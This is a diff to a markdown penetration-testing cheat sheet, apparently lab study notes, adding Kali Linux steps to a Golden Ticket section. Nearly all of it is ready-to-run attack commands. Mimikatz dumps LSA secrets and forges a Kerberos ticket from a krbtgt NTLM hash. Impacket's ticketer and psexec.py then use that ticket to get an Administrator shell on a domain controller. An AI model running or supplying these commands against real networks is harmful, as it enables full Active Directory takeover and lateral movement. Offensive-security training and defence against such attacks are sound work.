@@ -284,12 +284,22 @@ ticketer.py -spn SPN -domain-sid DOMAIN SID -nthash NTLM -dc-ip IP_VICTIM -domai
 
 ## Golden Tickets
 ```bash
+# on windows
 privilege::debug
 lsadump::lsa
 kerberos::purge
 kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
 misc::cmd
 PsExec64.exe \\DC1 cmd.exe
+
+
+# on kali
+impacket-ticketer -nthash 1693c6cefafffc7af11ef34d1c788f47 -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
+export KRB5CCNAME=./Administrator.ccache     
+mousepad /etc/resolv.conf
+    add > nameserver 192.168.x.x
+(or add dc1.corp.com inside of /etc/hosts file otherwise this attack will fail)
+psexec.py Administrator@dc1.corp.com -k -no-pass
 ```
 
 
